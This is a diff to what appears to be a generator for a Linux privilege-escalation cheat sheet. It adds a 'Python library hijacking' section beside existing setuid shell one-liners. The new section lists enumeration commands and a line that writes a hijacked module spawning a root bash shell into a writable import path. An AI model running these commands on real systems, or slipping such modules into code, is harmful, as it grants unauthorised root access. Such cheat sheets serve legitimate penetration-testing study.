@@ -716,6 +716,14 @@ SECTIONS = [
                 "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
                 "/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\";'",
             ]),
+            ("h2", "Python library hijacking"),
+            ("code", [
+                "sudo -l",
+                "python3 -c 'import sys; print(sys.path)'",
+                "ls -la script.py $(dirname script.py)",
+                "find / -name '*.py' -writable ! -path '/proc/*' 2>/dev/null",
+                "echo 'import os; os.setuid(0); os.system(\"/bin/bash\")' > /dir_escribible/modulo_importado.py",
+            ]),
             ("h2", "Cron / tareas"),
             ("code", [
                 "cat /etc/crontab; ls -la /etc/cron.*",
